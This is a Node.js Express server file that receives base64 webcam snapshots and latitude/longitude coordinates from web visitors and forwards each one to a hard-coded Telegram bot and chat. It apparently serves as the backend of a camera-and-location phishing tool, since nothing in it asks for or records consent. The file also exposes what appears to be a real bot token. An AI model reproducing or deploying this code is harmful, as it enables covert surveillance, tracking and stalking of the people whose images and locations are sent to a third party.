const express = require('express');
const cors = require('cors'); // Import cors
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const axios = require('axios');
const FormData = require('form-data');

const app = express();

// Enable CORS for all routes
app.use(cors());

// Increase request size limit to 50MB
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

const port = 3000;

// Serve static files (HTML, CSS, JS)
app.use(express.static(path.join(__dirname, 'public')));

// Telegram bot configuration
const telegramBotToken = '7977890436:AAF3sM8rgfHMGRjlFwHlm9eJi3pUE0rDBdI'; // Replace with your bot token
const chatId = '1819194668'; // Replace with your chat ID
// Function to send an image to Telegram
const sendImageToTelegram = async (filePath) => {
    const form = new FormData();
    form.append('chat_id', chatId);
    form.append('photo', fs.createReadStream(filePath)); // Read the file stream

    try {
        await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, form, {
            headers: form.getHeaders(),
        });
        console.log('Image sent to Telegram successfully!');
    } catch (error) {
        console.error('Error sending image to Telegram:', error);
    }
};

// Function to send location text as a message to Telegram
const sendLocationTextToTelegram = async (latitude, longitude) => {
    const message = `Location saved successfully! Latitude: ${latitude}, Longitude: ${longitude}`;
    try {
        await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
            chat_id: chatId,
            text: message,
        });
        console.log('Location text sent to Telegram successfully!');
    } catch (error) {
        console.error('Error sending location text to Telegram:', error);
    }
};

// Function to send actual latitude and longitude to Telegram using sendLocation API
const sendCoordinatesToTelegram = async (latitude, longitude) => {
    try {
        await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendLocation`, {
            chat_id: chatId,
            latitude: latitude,
            longitude: longitude,
        });
        console.log('Coordinates sent to Telegram successfully!');
    } catch (error) {
        console.error('Error sending coordinates to Telegram:', error);
    }
};

// API endpoint to save images
app.post('/save-image', async (req, res) => {
    const { image } = req.body;

    if (!image) {
        return res.status(400).json({ error: 'Image data is missing' });
    }

    // Decode base64 image
    const base64Data = image.replace(/^data:image\/png;base64,/, "");

    // Generate a unique filename using UUID
    const uniqueFilename = `snapshot_${uuidv4()}.png`;
    const filePath = path.join(__dirname, 'public', 'images', uniqueFilename);

    // Save image to the server
    fs.writeFile(filePath, base64Data, 'base64', async (err) => {
        if (err) {
            console.error('Error saving image:', err);
            return res.status(500).json({ error: 'Failed to save image' });
        }

        // Send the actual image to Telegram
        await sendImageToTelegram(filePath);
        res.json({ message: 'Image saved and sent to Telegram successfully!', filePath: uniqueFilename });
    });
});

// API endpoint to save location
app.post('/save-location', async (req, res) => {
    const { latitude, longitude } = req.body;

    if (!latitude || !longitude) {
        return res.status(400).json({ error: 'Location data is missing' });
    }

    // Send location data as text to Telegram
    await sendLocationTextToTelegram(latitude, longitude);

    // Send actual coordinates to Telegram using sendLocation API
    await sendCoordinatesToTelegram(latitude, longitude);

    res.json({ message: 'Location saved and sent to Telegram successfully!' });
});

// Start server
app.listen(port, () => {
    console.log(`Server running on http://localhost:${port}`);
});